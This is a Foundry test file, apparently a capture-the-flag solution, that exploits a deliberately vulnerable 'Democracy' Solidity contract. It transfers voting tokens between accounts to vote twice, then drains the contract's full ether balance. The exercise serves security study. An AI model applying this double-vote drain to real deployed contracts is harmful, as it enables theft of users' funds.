// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Democracy} from "../src/Democracy.sol";

contract TrusterTest is Test {
    Democracy public democracy;
    address user1 = vm.addr(1);
    address user2 = vm.addr(2);
    address user3 = vm.addr(3);

    function setUp() public {
        vm.startPrank(user1);
        vm.deal(user1, 100 ether);
        vm.deal(user2, 1 ether);
        vm.deal(user3, 100 ether);

        democracy = new Democracy();
        vm.deal(address(democracy), 100 ether);
        democracy.nominateChallenger(user2);
    }

    function test_overmintExploitr() public {
        assertEq(address(user2).balance,  1 ether);
        assertEq(address(democracy).balance,  100 ether);

        vm.startPrank(user2, user2);
        democracy.transferFrom(user2, user3, 0);
        democracy.vote(user2);
        
        
        democracy.transferFrom(user2, user3, 1);
        vm.startPrank(user3, user3);
        democracy.vote(user2);

        vm.startPrank(user2, user2);
        uint256 user2BalancePriorExploit = address(user2).balance;
        uint256 democracyBalancePriorExploit = address(democracy).balance;
        democracy.withdrawToAddress(user2);
        
        assertEq(address(democracy).balance,  0 ether);
        assertEq(address(user2).balance,  user2BalancePriorExploit + democracyBalancePriorExploit);
    }
}
